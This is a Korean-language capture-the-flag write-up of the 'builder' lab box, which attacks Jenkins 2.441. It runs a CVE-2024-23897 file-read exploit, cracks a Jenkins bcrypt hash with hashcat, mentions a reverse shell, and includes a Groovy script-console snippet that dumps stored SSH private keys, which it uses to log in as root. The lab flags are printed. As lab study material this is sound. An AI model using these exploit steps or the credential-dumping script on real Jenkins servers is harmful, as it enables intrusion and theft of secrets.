---
slug: "builder"
title: "builder"
date: 2026-07-17
category: "리눅스"
tags: []
excerpt: "일단 searchsploit ㄱㄱ ```sh searchsploit jenkins > Jenkins 2.441 - Local File Inclusion |…"
readingTime: 5
---

#### Box: builder | Linux | Medium
날짜: 2026 07 16
소요시간:

##### Open Ports
20
8080 : jenkins
##### Interesting Services
jenkins 2.441 버전이 8080 포트에 켜져 있음
[[Jeeves]] 여기서 한번 해봤던 것 같음 일단 전에 했던것 처럼 /script 로는 접근이 불가능함

일단 searchsploit ㄱㄱ
```sh
searchsploit jenkins
> Jenkins 2.441 - Local File Inclusion  | java/webapps/51993.py

searchsploit -m java/webapps/51993.py
```
-> [참고 사이트](https://ggonmerr.tistory.com/397) : 대충 이게 취약한 설정이 있어서 이게 LFI 취약점으로 이어진다는 것같음


##### Initial Foothold
벡터:
명령어:

```sh
python3 51993.py -u http://10.129.230.220:8080/
Press Ctrl+C to exit
File to download:
> /etc/passwd  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
....
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
....
sync:x:4:65534:sync:/bin:/bin/sync
```

https://github.com/verylazytech/CVE-2024-23897
여기서 필요한 파일들 이름 봤음
```xml
## /var/jenkins_home/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
    
    
## /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>

```
-> 이거 hashcat 으로 풀면 

```sh
hashcat -m 3200 -a 0 jennifer.hash /usr/share/wordlists/rockyou.txt
> princess
```
이 `jennifer:princess` 계정으로 로그인 한 후에 [[Jeeves]]에서 했던거랑 비슷하게 /script 들어가서 리버스쉘 커줌 [hackviser](https://hackviser.com/tactics/pentesting/services/jenkins)

**user.txt :** 57287ad939ef5dda32dfe001a1f32288

##### Privilege Escalation
벡터:
명령어:
일단 [CVE-2022-0847-POCs](https://github.com/ajith737/Dirty-Pipe-CVE-2022-0847-POCs)가 곧죽어도 안먹힘

일단 쉘 업그레이드 부터 해줌
```sh
script -qc bash /dev/null
```

이 아니라 또 [hackviser](https://hackviser.com/tactics/pentesting/services/jenkins) 여기 들어가니까 
이런게 있길래 /script에 들어가서 써보니
```groovy
// Dump SSH keys  
def sshCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(  
com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey.class,  
Jenkins.instance,  
null,  
null  
);  
  
for (c in sshCreds) {  
println(c.id + ":" + c.username);  
println(c.privateKey);  
}
```
-> ssh private 키가 나옴

```sh
ssh -i root_rsa root@10.129.7.114
```
**root.txt :** 4e02afc20a0e2425b4257c1a625d383c

##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- 제발 어떤 단서가 나오면 끝까지 읽어볼것 특히 hackviser 여기 좋은거 같음 
